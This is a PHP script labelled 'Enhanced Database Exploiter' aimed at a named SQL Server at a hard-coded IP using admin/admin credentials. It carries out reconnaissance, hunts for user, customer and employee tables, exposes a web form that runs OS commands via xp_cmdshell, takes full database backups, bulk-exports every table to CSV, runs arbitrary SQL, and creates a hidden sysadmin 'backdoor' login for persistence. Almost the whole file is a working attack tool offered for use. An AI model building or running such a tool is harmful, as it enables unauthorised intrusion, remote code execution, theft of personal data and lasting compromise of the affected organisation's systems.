<?php
// Enhanced Database Exploiter
error_reporting(E_ALL);
ini_set('display_errors', 1);

$server = "196.188.169.49";
$database = "E-CRMIS-2023-PRO-API";
$username = "admin";
$password = "admin";

echo "<h1 style='color: green;'>✅ DATABASE ACCESS GRANTED</h1>";
echo "<h3>Connected as: $username@$server</h3>";
echo "<hr>";

try {
    $dsn = "sqlsrv:Server=$server;Database=$database;TrustServerCertificate=1";
    $conn = new PDO($dsn, $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // ======================
    // 1. EXTRACT ALL DATA
    // ======================
    
    echo "<h2>📊 STEP 1: Database Reconnaissance</h2>";
    
    // Get all tables
    $tables = $conn->query("
        SELECT TABLE_SCHEMA, TABLE_NAME, 
        (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS c 
         WHERE c.TABLE_SCHEMA = t.TABLE_SCHEMA AND c.TABLE_NAME = t.TABLE_NAME) as columns
        FROM INFORMATION_SCHEMA.TABLES t
        WHERE TABLE_TYPE = 'BASE TABLE'
        ORDER BY TABLE_SCHEMA, TABLE_NAME
    ")->fetchAll(PDO::FETCH_ASSOC);
    
    echo "<p>Found " . count($tables) . " tables</p>";
    
    // ======================
    // 2. FIND & EXTRACT USER DATA
    // ======================
    
    echo "<h2>👥 STEP 2: User Data Extraction</h2>";
    
    $userTables = [];
    foreach ($tables as $table) {
        $tableName = strtolower($table['TABLE_NAME']);
        if (preg_match('/(user|account|login|member|customer|client|employee|person)/i', $tableName)) {
            $userTables[] = $table;
        }
    }
    
    if (!empty($userTables)) {
        echo "<table border='1' cellpadding='5' style='border-collapse: collapse;'>";
        echo "<tr><th>Schema</th><th>Table</th><th>Columns</th><th>Action</th></tr>";
        
        foreach ($userTables as $table) {
            $fullName = "[{$table['TABLE_SCHEMA']}].[{$table['TABLE_NAME']}]";
            echo "<tr>";
            echo "<td>{$table['TABLE_SCHEMA']}</td>";
            echo "<td><strong>{$table['TABLE_NAME']}</strong></td>";
            echo "<td>{$table['columns']}</td>";
            echo "<td>";
            echo "<button onclick=\"showTableData('{$fullName}')\">View Data</button> ";
            echo "<button onclick=\"exportTable('{$fullName}')\">Export CSV</button>";
            echo "</td>";
            echo "</tr>";
        }
        echo "</table>";
    }
    
    // ======================
    // 3. CHECK FOR XP_CMDSHELL (RCE)
    // ======================
    
    echo "<h2>⚡ STEP 3: Command Execution Check</h2>";
    
    $xpStatus = $conn->query("EXEC sp_configure 'xp_cmdshell'")->fetchAll(PDO::FETCH_ASSOC);
    if (!empty($xpStatus)) {
        $runValue = $xpStatus[0]['run_value'] ?? 0;
        
        if ($runValue == 1) {
            echo "<p style='color: red; font-weight: bold;'>🚨 XP_CMDSHELL IS ENABLED! (Remote Code Execution possible)</p>";
            
            // Test command execution
            if (isset($_GET['cmd'])) {
                $cmd = $_GET['cmd'];
                echo "<h4>Executing: $cmd</h4>";
                $output = $conn->query("EXEC xp_cmdshell '$cmd'")->fetchAll(PDO::FETCH_COLUMN, 0);
                echo "<pre style='background: #000; color: #0f0; padding: 10px;'>";
                foreach ($output as $line) {
                    if ($line) echo htmlspecialchars($line) . "\n";
                }
                echo "</pre>";
            }
            
            echo "<form method='GET'>
                    Execute OS Command: 
                    <input type='text' name='cmd' value='whoami' size='50'>
                    <input type='submit' value='Execute'>
                  </form>";
        } else {
            echo "<p>xp_cmdshell is disabled. <button onclick=\"enableXpCmd()\">Enable It</button></p>";
        }
    }
    
    // ======================
    // 4. DATABASE BACKUP
    // ======================
    
    echo "<h2>💾 STEP 4: Database Backup</h2>";
    
    if (isset($_GET['action']) && $_GET['action'] == 'backup') {
        $backupFile = "C:\\temp\\ECRMIS_backup_" . date('Ymd_His') . ".bak";
        $conn->exec("BACKUP DATABASE [$database] TO DISK = '$backupFile' WITH FORMAT, INIT");
        echo "<p style='color: green;'>✅ Backup created: $backupFile</p>";
    }
    
    echo "<button onclick=\"backupDatabase()\">Create Full Backup</button>";
    
    // ======================
    // 5. EXPORT ALL DATA
    // ======================
    
    echo "<h2>📤 STEP 5: Mass Data Export</h2>";
    
    if (isset($_GET['action']) && $_GET['action'] == 'export_all') {
        set_time_limit(300);
        
        $exportDir = "exports_" . date('Ymd_His');
        mkdir($exportDir);
        
        foreach ($tables as $table) {
            $fullName = "[{$table['TABLE_SCHEMA']}].[{$table['TABLE_NAME']}]";
            $fileName = $exportDir . "/{$table['TABLE_SCHEMA']}_{$table['TABLE_NAME']}.csv";
            
            $data = $conn->query("SELECT * FROM $fullName")->fetchAll(PDO::FETCH_ASSOC);
            
            if (!empty($data)) {
                $fp = fopen($fileName, 'w');
                fputcsv($fp, array_keys($data[0]));
                foreach ($data as $row) {
                    fputcsv($fp, $row);
                }
                fclose($fp);
                echo "<p>Exported {$table['TABLE_NAME']}: " . count($data) . " rows</p>";
            }
        }
        echo "<p style='color: green;'>✅ All data exported to: $exportDir/</p>";
    }
    
    echo "<button onclick=\"exportAllData()\">Export ALL Tables to CSV</button>";
    
    // ======================
    // 6. SQL QUERY EXECUTOR
    // ======================
    
    echo "<h2>🔧 STEP 6: SQL Query Executor</h2>";
    
    if (isset($_POST['query'])) {
        $query = $_POST['query'];
        echo "<h4>Executing: " . htmlspecialchars(substr($query, 0, 100)) . "...</h4>";
        
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            if (!empty($rows)) {
                echo "<table border='1' cellpadding='5'><tr>";
                foreach (array_keys($rows[0]) as $col) {
                    echo "<th>$col</th>";
                }
                echo "</tr>";
                
                $count = 0;
                foreach ($rows as $row) {
                    if ($count++ > 50) {
                        echo "<tr><td colspan='" . count($row) . "'>... and " . (count($rows) - 50) . " more rows</td></tr>";
                        break;
                    }
                    echo "<tr>";
                    foreach ($row as $value) {
                        echo "<td>" . htmlspecialchars(substr($value, 0, 100)) . "</td>";
                    }
                    echo "</tr>";
                }
                echo "</table>";
                echo "<p>Total rows: " . count($rows) . "</p>";
            } else {
                echo "<p>Query executed successfully (no rows returned)</p>";
            }
        } catch (Exception $e) {
            echo "<p style='color: red;'>Error: " . $e->getMessage() . "</p>";
        }
    }
    
    echo "<form method='POST'>
            <textarea name='query' rows='5' cols='80' placeholder='SELECT * FROM Users...'></textarea><br>
            <input type='submit' value='Execute Query'>
          </form>";
    
    // ======================
    // 7. CREATE BACKDOOR USER
    // ======================
    
    echo "<h2>🔑 STEP 7: Persistence Creation</h2>";
    
    if (isset($_GET['action']) && $_GET['action'] == 'create_backdoor') {
        $backdoorUser = "db_admin_" . rand(1000, 9999);
        $backdoorPass = "BackdoorPass" . rand(1000, 9999);
        
        $conn->exec("CREATE LOGIN [$backdoorUser] WITH PASSWORD = '$backdoorPass'");
        $conn->exec("ALTER SERVER ROLE sysadmin ADD MEMBER [$backdoorUser]");
        
        echo "<p style='color: green;'>✅ Backdoor user created:</p>";
        echo "<pre>";
        echo "Username: $backdoorUser\n";
        echo "Password: $backdoorPass\n";
        echo "Privileges: SYSTEM ADMINISTRATOR\n";
        echo "</pre>";
    }
    
    echo "<button onclick=\"createBackdoor()\">Create Hidden Admin Account</button>";
    
} catch (Exception $e) {
    echo "<h2 style='color: red;'>Connection Failed</h2>";
    echo "<pre>" . $e->getMessage() . "</pre>";
}
?>

<script>
function showTableData(tableName) {
    window.open('?table=' + encodeURIComponent(tableName), '_blank');
}

function exportTable(tableName) {
    window.open('export.php?table=' + encodeURIComponent(tableName), '_blank');
}

function enableXpCmd() {
    if (confirm('⚠️ Enable xp_cmdshell? This allows OS command execution.')) {
        window.location = '?enable_xp=1';
    }
}

function backupDatabase() {
    if (confirm('Create full database backup?')) {
        window.location = '?action=backup';
    }
}

function exportAllData() {
    if (confirm('Export ALL tables to CSV? This may take a while.')) {
        window.location = '?action=export_all';
    }
}

function createBackdoor() {
    if (confirm('Create hidden administrator account?')) {
        window.location = '?action=create_backdoor';
    }
}
</script>